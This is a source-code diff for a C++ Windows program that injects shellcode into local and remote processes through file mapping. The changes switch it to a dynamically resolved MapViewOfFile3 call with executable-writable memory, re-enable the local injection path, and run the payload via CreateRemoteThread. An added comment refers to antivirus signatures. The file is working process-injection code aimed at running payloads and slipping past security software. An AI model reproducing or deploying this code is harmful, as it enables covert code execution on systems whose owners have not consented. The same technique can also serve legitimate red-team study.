@@ -18,14 +18,16 @@ typedef LPVOID(WINAPI* MapViewOfFileFunctionPointer)(
 	SIZE_T     dwNumberOfBytesToMap
 );
 
-typedef PVOID(WINAPI* MapViewOfFile2FunctionPointer)(
-	HANDLE  FileMappingHandle,
-	HANDLE  ProcessHandle,
-	ULONG64 Offset,
-	PVOID   BaseAddress,
-	SIZE_T  ViewSize,
-	ULONG   AllocationType,
-	ULONG   PageProtection
+typedef PVOID(WINAPI* MapViewOfFile3FunctionPointer)(
+	HANDLE                 FileMapping,
+	HANDLE                 Process,
+	PVOID                  BaseAddress,
+	ULONG64                Offset,
+	SIZE_T                 ViewSize,
+	ULONG                  AllocationType,
+	ULONG                  PageProtection,
+	MEM_EXTENDED_PARAMETER* ExtendedParameters,
+	ULONG                  ParameterCount
 );
 
 BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
@@ -91,9 +93,9 @@ BOOL RemoteMapInject(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSi
 
 	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
 
-	MapViewOfFile2FunctionPointer MapViewOfFile2 = (MapViewOfFile2FunctionPointer)GetProcAddress(hModuleMemory, "MapViewOfFile2");;
+	MapViewOfFile3FunctionPointer MapViewOfFile3 = (MapViewOfFile3FunctionPointer)GetProcAddress(LoadLibraryA("kernelbase.dll"), "MapViewOfFile3");
 
-	pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READWRITE);
+	pMapRemoteAddress = MapViewOfFile3(hFile, hProcess, NULL, 0, 0, 0, PAGE_EXECUTE_READWRITE, NULL, 0);
 	if (pMapRemoteAddress == NULL) {
 		std::cout << "[!] MapViewOfFile2 Failed With Error : " << GetLastError() << std::endl;
 		bSTATE = FALSE;
@@ -145,7 +147,7 @@ int main() {
 	DWORD threadId = 0;
 	HANDLE hThread = NULL;
 
-	/*
+	
 	if (!LocalMapInject((BYTE*)shellcode, sizeof(shellcode), &injectedAdress)) {
 		std::cout << "[!] Error Injecting" << std::endl;
 	}
@@ -158,7 +160,7 @@ int main() {
 
 	std::cout << "[+] Injected Thread ID: " << threadId << std::endl;
 	WaitForSingleObject(hThread, INFINITE);
-	*/
+	
 
 
 	// REMOTE INJECTION
@@ -173,6 +175,7 @@ int main() {
 		std::cout << "[!] Error Injecting" << std::endl;
 	}
 
+	// AV Signature
 	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectedAdress, NULL, 0, &threadId);
 	if (hThread == NULL) {
 		std::cout << "[!] Error: " << GetLastError() << std::endl;
